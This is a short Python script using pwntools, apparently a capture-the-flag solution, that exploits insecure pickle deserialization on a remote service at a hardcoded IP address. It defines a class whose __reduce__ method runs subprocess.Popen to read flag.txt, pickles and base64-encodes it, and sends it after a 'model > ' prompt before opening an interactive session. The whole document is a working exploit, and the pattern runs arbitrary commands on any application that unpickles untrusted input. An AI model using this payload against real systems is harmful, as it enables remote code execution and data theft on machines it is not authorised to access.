from pwn import *
import base64
import subprocess
import pickle

REMOTE = True

if REMOTE:
    HOST, PORT = '54.180.153.92', 30001
else:
    HOST, PORT = 'localhost', 30001

io = remote(HOST, PORT)

class Exploit(object):
    def __reduce__(self):
        return (subprocess.Popen, (('cat', 'flag.txt'),))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload))
io.sendlineafter('model > ', base64.b64encode(payload))

io.interactive()
